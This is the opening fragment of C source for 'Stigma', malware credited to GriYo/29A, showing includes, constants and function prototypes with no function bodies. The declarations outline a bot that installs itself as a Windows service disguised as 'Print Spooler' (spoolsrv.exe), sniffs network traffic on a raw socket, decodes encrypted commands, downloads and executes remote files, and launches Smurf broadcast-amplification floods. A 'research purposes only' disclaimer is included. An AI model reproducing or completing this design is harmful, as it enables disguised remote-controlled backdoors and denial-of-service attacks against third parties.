#include <winsock2.h>
#include <windows.h>
#include <Wininet.h>
#include <mstcpip.h>
#include <ws2tcpip.h>

#include "..\Headers.h"
#include "..\Blowfish\Blowfish.h"
#include "..\RMD160\RMD160.h"

#define MAX_IF					256
#define MAX_IP_SIZE				65536

#define SERVICE_NAME			"Print Spooler"
#define SERVICE_DISPLAY_NAME	"Loads files to memory for later printing."
#define SERVICE_FILE			"spoolsrv.exe"

#define AUTHOR					"Stigma - BioCoded by GriYo/29A"
#define DISCLAIMER				"This program has been created for researching purposes only."

BOOL InitStigma( void) ;
BOOL GetInterface( SOCKET s, SOCKADDR_IN *ifx, int index) ;
DWORD WINAPI SnifferThread( LPVOID lpParameter) ;
void DecodeIp( WSABUF *wsabuf) ;
void GetFile( char *szUrl, char *szLocal, unsigned long dwSize, unsigned long dwFlags) ;
void Execute( char *App, char *Params) ;
void Smurf( unsigned long *Target, int Count) ;
USHORT checksum( USHORT *buffer, int size) ;
void UpdateBroadcastList( char *Filename) ;
VOID WINAPI ServiceProc( DWORD fdwControl) ;
void ServiceInstall( void) ;

unsigned long			BroadcastList[ NUMBEROF_BROADCAST_ADDR] ;
SERVICE_STATUS_HANDLE	hStatus ;
BLOWFISH_CTX			ctx ;
dword					MDbuf[ RMDsize / 32] ;